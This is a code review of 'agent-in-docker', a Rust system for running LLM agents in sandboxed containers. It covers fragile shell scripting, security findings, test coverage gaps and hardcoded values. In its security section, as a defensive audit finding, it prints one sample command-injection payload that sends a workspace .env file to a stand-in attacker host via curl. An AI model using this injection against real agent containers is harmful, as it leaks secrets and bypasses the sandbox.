# Code Review: agent-in-docker

**Date:** 2026-03-29
**Scope:** Full codebase (~3,900 lines Rust, ~140 lines shell, Containerfile, configs)

---

## Executive Summary

This is a well-architected system for running LLM agents in sandboxed containers with human-in-the-loop oversight. The security model is thoughtful (role-based permissions, hardcoded denials, container isolation, UID matching). However, the project has **significant test coverage gaps** (only 18 tests covering 2 of 16 source files), several **fragile shell scripting patterns** including a command injection vector, and numerous **hardcoded values** that will cause problems as the system scales.

**No unsafe Rust code** was found. No hardcoded secrets were found. The Rust code is generally well-structured.

---

## Table of Contents

1. [Fragility Hotspots](#1-fragility-hotspots)
2. [Security Issues](#2-security-issues)
3. [Test Coverage Analysis](#3-test-coverage-analysis)
4. [Hardcoded Values & Configuration Debt](#4-hardcoded-values--configuration-debt)
5. [Error Handling Gaps](#5-error-handling-gaps)
6. [Race Conditions & Concurrency](#6-race-conditions--concurrency)
7. [Resource Management](#7-resource-management)
8. [Recommendations by Priority](#8-recommendations-by-priority)

---

## 1. Fragility Hotspots

These are the areas most likely to break under real-world conditions.

### 1.1 `scripts/entrypoint.sh` — The Weakest Link

The container entrypoint is a 99-line bash script that handles credential restoration, UID matching, user creation, MCP configuration, and privilege dropping. It is the most fragile component in the system.

**Why it's fragile:**
- Missing `set -o pipefail` — piped command failures are silently swallowed
- Manual `/etc/passwd` editing (line 70) as a fallback when `adduser` fails — assumes specific format, no validation that UID/GID are numeric, can corrupt the passwd file
- Inline Node.js for JSON manipulation (lines 22-31) — fragile, error-suppressed with `|| true`
- Platform-dependent `stat` flags (Linux `-c` vs macOS `-f`) with heuristic detection
- No signal traps — interrupted runs leave partial state (created users, modified files)

**Most critical fragility — UID matching (lines 62-73):**
```bash
WORKSPACE_UID=$(stat -c '%u' /workspace 2>/dev/null || stat -f '%u' /workspace)
if ! id -u "${WORKSPACE_UID}" >/dev/null 2>&1; then
    adduser -D -u "${WORKSPACE_UID}" -h /home/agent -s /bin/sh "${USERNAME}" 2>/dev/null || \
        echo "${USERNAME}:x:${WORKSPACE_UID}:${WORKSPACE_GID}::/home/agent:/bin/sh" >> /etc/passwd
```
If `adduser` fails silently and the `echo` fallback writes a malformed line, the container will fail in hard-to-diagnose ways.

### 1.2 `crates/cli/src/container.rs` — Process Orchestration

**`auto_accept_dialogs()` (lines 224-264):**
- Polls tmux pane output in a loop (30 iterations x 2s sleep = 60s timeout)
- Pattern-matches terminal output strings to detect dialog prompts
- Sends keystrokes blindly via `tmux send-keys`
- All exit statuses ignored (`let _ = ...`)
- If Claude Code changes its dialog text, this silently stops working

**`find_dolt_port()` (lines 48-64):**
- Parses `lsof` output with string splitting — assumes specific column layout
- No validation that parsed port is in valid range
- Silent failure returns `None`, which may or may not be handled by callers

### 1.3 `crates/cli/src/services.rs` — Daemon Management

**PID file management (lines 6-17):**
- Reads PID from `/tmp/agent-in-docker-orchestrator.pid`
- Checks with `kill -0` — but between read and check, PID could be recycled
- Stale PID file pointing to an unrelated process will make the CLI think the orchestrator is already running
- No lockfile or socket-based liveness check

**Orchestrator startup (lines 38-71):**
- Spawns child process and immediately drops the `Child` handle
- 1-second sleep as "startup wait" — no actual readiness check
- If the process crashes on startup, the PID file still exists and points to a dead process

### 1.4 Disconnected Registries (`server.rs` + `mcp.rs`)

The WebSocket agent registry and MCP HTTP request system are separate subsystems connected only by the `AgentRegistry` trait. Agents connecting via MCP HTTP (containers) don't appear in the WebSocket registry. This means:
- `list_agents` returns incomplete results
- TUI shows "Agents: 0" even when containers are actively running
- No unified view of system state

### 1.5 MCP Request Timeout

MCP tool calls have a hardcoded 300-second (5-minute) timeout (`mcp.rs:315`). Claude Code itself has a 60-second MCP timeout. If a user takes longer than 60 seconds to respond to an `ask_user` prompt, Claude Code will timeout and the response is lost. The 300s server timeout is never actually reached.

---

## 2. Security Issues

### 2.1 CRITICAL: Command Injection in entrypoint.sh

**Lines 86, 89, 93, 96:**
```bash
exec su -s /bin/bash "${USERNAME}" -c "HOME=/home/agent claude ${CLAUDE_ARGS} -p '${AGENT_PROMPT}'"
```

`AGENT_PROMPT` is an environment variable passed from the host CLI into the container. It is interpolated inside single quotes within a double-quoted string. If the prompt contains a single quote followed by shell metacharacters, arbitrary commands execute inside the container as the agent user.

**Example exploit:**
```
AGENT_PROMPT="'; curl http://evil.com/exfil?data=$(cat /workspace/.env); echo '"
```

**Mitigation:** The container runs with `--cap-drop=ALL` and limited capabilities, and the agent user has restricted permissions. But within those constraints, an attacker could read/modify `/workspace` contents.

**Fix:** Use `exec su -s /bin/bash "${USERNAME}" -c "..." -- "$AGENT_PROMPT"` or write the prompt to a temp file and read it.

### 2.2 HIGH: No Binary Verification in Containerfile

Downloaded binaries (`beads`, `dolt`) have no checksum or signature verification:
```dockerfile
curl -fsSL "https://github.com/steveyegge/beads/releases/download/${VERSION}/..." | tar -xz -C /usr/local/bin
```
A compromised GitHub release or MITM attack could inject malicious binaries.

### 2.3 MEDIUM: Symlink Traversal in file_read Handler

`handlers/file_read.rs` checks `path.exists()` and `path.is_file()` but does not resolve symlinks before permission checking. An agent could potentially request a path that passes glob-based permission checks but symlinks to a denied path.

The permission checker in `permissions.rs` does call `canonicalize()`, which resolves symlinks — but only when the file exists. For non-existent paths, it falls back to component-based normalization which wouldn't resolve symlinks.

### 2.4 LOW: World-Readable Credential Key

`.beads/.beads-credential-key` has `rwxrwxrwx` permissions. Should be `600` or `400`.

---

## 3. Test Coverage Analysis

### 3.1 Overall Numbers

| Metric | Value |
|--------|-------|
| Total tests | 18 |
| Files with tests | 2 of 16 (12.5%) |
| Test type | Unit tests only |
| Integration tests | None |
| Benchmarks | None |
| CI/CD pipeline | Not configured |

### 3.2 What IS Tested

**`permissions.rs` — 15 tests (GOOD coverage)**
- Capability checking (enabled/disabled/unknown roles)
- File read permission validation (allowed paths, deny globs, hardcoded blocks)
- Git push permission validation
- Environment variable expansion (`${HOME}`, `~`)
- Uses trait-based mocking (`FakeEnv` for `EnvResolver`)

**`handlers/file_read.rs` — 3 tests (BASIC coverage)**
- Reading existing files
- Non-existent file error
- Directory rejection

### 3.3 What is NOT Tested

#### No Tests At All — High Risk

| Module | Lines | What's Untested |
|--------|-------|-----------------|
| `server.rs` | 990 | WebSocket server, agent registration, message routing, connection lifecycle, request handling, the entire async event loop |
| `mcp.rs` | 534 | HTTP MCP server, all 5 tool endpoints, request/response lifecycle, timeout handling, JSON-RPC protocol compliance |
| `app.rs` | 412 | TUI application state, keybinding handlers, request approval/denial logic, input handling |
| `container.rs` | 317 | Container image building, podman invocation, tmux session management, auto-accept dialog polling |
| `config.rs` | 232 | Config discovery, credential management, agent directory setup/teardown |
| `ui.rs` | 191 | Terminal rendering (lower priority — visual) |
| `services.rs` | 150 | Orchestrator daemon management, dolt startup, port detection |
| `main.rs` (tui) | 135 | Server spawning, event loop, terminal setup/restore |
| `main.rs` (cli) | 127 | CLI arg parsing, subcommand dispatch, cleanup |
| `types.rs` | 115 | Message serialization/deserialization (critical for protocol correctness) |
| `login.rs` | 87 | OAuth flow |
| `git_push.rs` | 34 | Git push execution, branch detection |

#### Specific High-Value Missing Tests

1. **WebSocket protocol compliance** — No tests verify that agents can register, send messages, or that malformed messages are handled gracefully. `server.rs` is the largest file (990 lines) with zero tests.

2. **MCP JSON-RPC compliance** — No tests verify tool call request/response format, error responses, or timeout behavior.

3. **Permission + handler integration** — The permission checker is well-tested in isolation, but there are no tests verifying that `file_read` or `git_push` handlers actually invoke permission checks correctly.

4. **Message serialization roundtrips** — `types.rs` defines the protocol messages but has no tests confirming they serialize/deserialize correctly.

5. **Config discovery edge cases** — `config.rs` has complex path resolution logic (finding project root from binary location, credential symlinks) with no tests.

6. **Container launch arguments** — `container.rs` builds complex podman command lines with many flags. No tests verify the generated commands are correct.

7. **Error paths** — Almost no error paths are tested anywhere. What happens when the WebSocket connection drops mid-message? When a role YAML file is malformed? When podman isn't installed?

### 3.4 Test Infrastructure

Existing test infrastructure is minimal but well-designed:
- `FakeEnv` — mock environment variable resolver (permissions tests)
- `NoOpRegistry` — stub agent registry (MCP tests, defined but unused)
- `tempfile` crate — for file_read tests
- `reqwest` — available as dev dependency but unused

**Missing infrastructure:**
- No async test helpers for WebSocket/HTTP testing
- No test fixtures for role YAML files
- No mock containers or process spawning
- No snapshot testing for TUI output

---

## 4. Hardcoded Values & Configuration Debt

These values are embedded directly in source code and will cause friction when deploying, debugging, or running multiple instances.

| Value | Location | Risk |
|-------|----------|------|
| Port `9800` (WebSocket) | `config.rs:49`, `tui/main.rs:29`, tests | Can't run multiple orchestrators |
| Port `9801` (MCP HTTP) | `config.rs:50`, `tui/main.rs:49` | Derived from 9800 via string replace |
| `/tmp/orchestrator.log` | `tui/main.rs:21` | Shared /tmp, no rotation, fills disk |
| `/tmp/agent-in-docker-orchestrator.pid` | `config.rs:53` | Predictable path, TOCTOU vulnerable |
| 300s MCP timeout | `mcp.rs:315` | Not configurable |
| 60s auto-accept timeout | `container.rs:227` | Magic number (30 iterations x 2s) |
| `host.containers.internal` | `container.rs:94` | Podman-specific DNS, won't work with Docker |
| `/home/agent` | `entrypoint.sh:65,70,76` | Hardcoded home directory |

---

## 5. Error Handling Gaps

### 5.1 Unwrap Calls in Production Code

These will panic (crash the process) if the assumption is violated:

| Location | Call | Risk |
|----------|------|------|
| `server.rs:61,67` | `serde_json::to_string().unwrap()` | Low — serializing known types |
| `server.rs:117,504,506` | `serde_json::to_value().unwrap()` | Low — known types |
| `mcp.rs:180` | `serde_json::to_string().unwrap()` | Low — known types |
| `config.rs:27` | `exe.parent().unwrap()` | Medium — could panic if binary is at filesystem root |
| `container.rs:33,36` | `to_str().unwrap()` | Medium — panics on non-UTF8 paths |
| `services.rs:100` | `parse().unwrap()` | Low — format string is controlled |

The JSON serialization unwraps are low-risk (serializing known types should never fail), but `config.rs:27` and `container.rs:33,36` could realistically panic.

### 5.2 Silent Error Suppression

| Location | Pattern | Consequence |
|----------|---------|-------------|
| `container.rs:239-246` | `let _ = Command::new("tmux")...` | tmux failures silently ignored |
| `main.rs:121` (cli) | `let _ = std::fs::remove_dir_all(...)` | Cleanup failure silent |
| `entrypoint.sh:22-31` | `node -e "..." \|\| true` | JSON manipulation failures hidden |
| `Containerfile:18-19` | `tar ... \|\| echo "Warning..."` | Missing binary not treated as error |

---

## 6. Race Conditions & Concurrency

### 6.1 PID File Race (services.rs)

```
Thread A: reads PID 1234 from file
Thread A: kill(1234, 0) → process exists → "orchestrator is running"
                                           ↑ But PID 1234 was recycled to an unrelated process
```

**Impact:** CLI thinks orchestrator is running when it isn't, or sends signals to wrong process.

### 6.2 Agent Directory Setup (config.rs:73-89)

```
Thread A: checks if dir exists → yes
Thread A: removes dir
Thread B: creates file in dir (between check and remove)
Thread A: recreates dir → Thread B's file is gone
```

**Impact:** Low in practice (CLI is single-threaded), but the pattern is unsafe.

### 6.3 Credential File Replacement (config.rs:94-99)

```
remove old credentials symlink
                              ← agent starts here, can't find credentials
copy new credentials file
```

**Impact:** Agent launched between remove and copy will fail to authenticate.

### 6.4 Unbounded Channels

All `mpsc` channels in the system are unbounded (`mpsc::unbounded_channel()`). If a consumer falls behind (e.g., TUI is slow to render), messages accumulate in memory without limit. Under sustained load, this could cause OOM.

---

## 7. Resource Management

### 7.1 Process Lifecycle

- Orchestrator daemon is spawned and the `Child` handle is dropped — no way to detect if it crashes after startup
- No watchdog or automatic restart
- PID file is the only tracking mechanism (see race condition above)
- No graceful shutdown protocol — killing the orchestrator drops all connected agents

### 7.2 Log File Growth

`/tmp/orchestrator.log` is opened for writing with no rotation, truncation, or size limit. Long-running orchestrator sessions will fill disk.

### 7.3 WebSocket Connection Cleanup

WebSocket connections are properly cleaned up when `handle_connection()` returns (Rust's Drop semantics). Agent deregistration on disconnect is handled. This is well-implemented.

---

## 8. Recommendations by Priority

### P0 — Fix Before Production Use

1. **Fix command injection in entrypoint.sh** — Escape or file-pass `AGENT_PROMPT` instead of interpolating into shell command
2. **Add `set -o pipefail`** to entrypoint.sh and run-agent.sh
3. **Validate UID/GID are numeric** before writing to /etc/passwd

### P1 — High Impact Improvements

4. **Add tests for `server.rs`** — WebSocket connection handling, agent registration, message routing. This is the largest and most complex module with zero tests.
5. **Add tests for `mcp.rs`** — JSON-RPC request/response lifecycle, timeout behavior, tool call routing.
6. **Add tests for `types.rs`** — Serialization roundtrip tests for all message types.
7. **Replace PID file with socket-based liveness** — Bind a Unix socket; if bind fails, orchestrator is already running.
8. **Add binary checksum verification** to Containerfile downloads.

### P2 — Important but Not Urgent

9. **Make ports configurable** via environment variables or config file
10. **Add log rotation** or switch to a bounded log file
11. **Add CI/CD pipeline** — Even a basic `cargo test` + `cargo clippy` on push
12. **Add integration tests** for the permission-checker + handler chain
13. **Replace `auto_accept_dialogs` polling** with a more robust synchronization mechanism
14. **Unify WebSocket and MCP registries** so TUI shows all connected agents
15. **Add readiness check** after orchestrator startup instead of `sleep 1`

### P3 — Nice to Have

16. **Add `HEALTHCHECK`** to Containerfile
17. **Pin package versions** in Containerfile
18. **Add signal traps** to entrypoint.sh for cleanup
19. **Replace unbounded channels** with bounded ones + backpressure
20. **Add property-based tests** for permission glob matching edge cases
21. **Fix `.beads-credential-key` permissions** to 600

---

## Appendix: File-by-File Test Coverage Map

```
orchestrator/crates/core/src/
  lib.rs              ............... no tests needed (re-exports only)
  server.rs      990L ............... NO TESTS  <<<
  mcp.rs         534L ............... NO TESTS  <<<
  permissions.rs 405L ............... 15 tests  (good)
  types.rs       115L ............... NO TESTS  <<<
  handlers/
    file_read.rs  46L ............... 3 tests   (basic)
    git_push.rs   34L ............... NO TESTS  <<<

orchestrator/crates/tui/src/
  main.rs        135L ............... NO TESTS
  app.rs         412L ............... NO TESTS  <<<
  ui.rs          191L ............... NO TESTS

orchestrator/crates/cli/src/
  main.rs        127L ............... NO TESTS
  config.rs      232L ............... NO TESTS  <<<
  container.rs   317L ............... NO TESTS  <<<
  services.rs    150L ............... NO TESTS
  login.rs        87L ............... NO TESTS

<<< = high-priority gaps
```
